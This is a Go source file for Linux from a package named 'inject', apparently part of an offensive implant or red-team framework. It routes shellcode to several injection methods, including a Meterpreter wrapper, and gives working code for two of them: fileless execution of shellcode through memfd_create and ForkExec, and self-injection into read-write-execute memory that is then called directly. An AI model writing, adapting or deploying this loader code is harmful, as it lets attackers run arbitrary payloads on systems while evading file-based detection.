//go:build linux

package inject

import (
	"fmt"
	"os"
	"runtime"
	"syscall"
	"unsafe"
)

type linuxInjector struct {
	config *Config
}

func newPlatformInjector(cfg *Config) (Injector, error) {
	if cfg == nil {
		return nil, fmt.Errorf("config is nil")
	}
	return &linuxInjector{config: cfg}, nil
}

func (l *linuxInjector) Inject(shellcode []byte) error {
	switch l.config.Method {
	case MethodPtrace:
		return l.injectPtrace(shellcode)
	case MethodMemFD:
		return l.injectMemFD(shellcode)
	case MethodProcMem:
		return l.injectProcMem(shellcode)
	case MethodPureGoShellcode:
		return InjectPureGo(shellcode)
	case MethodPureGoMeterpreter:
		return fmt.Errorf("purego-meter requires sockfd; use InjectMeterpreterWrapper directly")
	default:
		return fmt.Errorf("unknown injection method for Linux: %s", l.config.Method)
	}
}

// injectMemFD uses memfd_create for fileless execution.
// sysMemfdCreate is defined per-architecture.
func (l *linuxInjector) injectMemFD(shellcode []byte) error {
	nameBytes, _ := syscall.BytePtrFromString("")

	fd, _, errno := syscall.Syscall(sysMemfdCreate, uintptr(unsafe.Pointer(nameBytes)), 0, 0)
	if errno != 0 {
		return fmt.Errorf("memfd_create failed (kernel >= 3.17 required): %w", errno)
	}
	defer syscall.Close(int(fd))

	_, err := syscall.Write(int(fd), shellcode)
	if err != nil {
		return fmt.Errorf("write to memfd failed: %w", err)
	}

	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)

	if err := os.Chmod(fdPath, 0755); err != nil {
		return fmt.Errorf("chmod memfd failed: %w", err)
	}

	_, err = syscall.ForkExec(fdPath, []string{fdPath}, &syscall.ProcAttr{
		Env:   os.Environ(),
		Files: []uintptr{0, 1, 2},
		Sys: &syscall.SysProcAttr{
			Setsid: true,
		},
	})
	if err != nil {
		return fmt.Errorf("ForkExec memfd failed: %w", err)
	}

	return nil
}

// injectProcMem uses mmap for self-injection.
func (l *linuxInjector) injectProcMem(shellcode []byte) error {
	mem, err := syscall.Mmap(
		-1, 0,
		len(shellcode),
		syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,
		syscall.MAP_ANONYMOUS|syscall.MAP_PRIVATE,
	)
	if err != nil {
		return fmt.Errorf("mmap failed: %w", err)
	}

	copy(mem, shellcode)

	shellcodeAddr := uintptr(unsafe.Pointer(&mem[0]))
	type shellcodeFunc func()
	execFunc := *(*shellcodeFunc)(unsafe.Pointer(&shellcodeAddr))

	go func() {
		runtime.LockOSThread()
		execFunc()
	}()

	return nil
}
